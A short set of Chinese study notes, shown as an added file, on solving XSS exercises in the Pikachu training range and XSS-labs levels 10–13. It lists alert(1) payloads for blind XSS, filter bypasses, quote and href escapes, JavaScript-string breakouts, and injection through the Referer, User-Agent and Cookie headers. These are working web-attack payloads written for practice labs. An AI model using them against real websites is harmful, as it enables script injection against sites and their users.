@@ -1,0 +1,26 @@
+Pikachu-实操-XSS漏洞
+XSS之盲打
+<img src=x onerror=alert(1) width="0" height="0">      #这里加入了对图片大小设置，隐蔽性高一些，虽然前段F12还是可以看出隐藏内容。
+
+XSS之过滤
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<input type="text" onclick="alert(1)">
+<svg onmouseover=alert(1)>
+
+XSS之htmlspecialchars
+' onclick='alert(1)             # ' 闭合前面的href='     'alert(1) 闭合后面的'
+javascript:alert(1) 
+
+XSS之href输出
+javascript:alert(1)             #这里的'被转义了&#039,所以直接用伪协议
+
+XSS之js输出
+'; alert(1); //                 # '闭合前面变量$ms=''; alert(1);  //注释后面的'
+
+XSS-labs    1-13关  根据源代码分辨从什么地方入手
+10-13关分别用t_sort="><input type "text" onclick="alert(1)"> 
+10关：直接加入t_sort="><input type "text" onclick="alert(1)"> 
+11关：HTTP_REFERER 加入t_sort="><input type "text" onclick="alert(1)"> 
+12关：HTTP_USER_AGENT加入t_sort="><input type "text" onclick="alert(1)"> 
+13关：COOKIE加入t_sort="><input type "text" onclick="alert(1)">
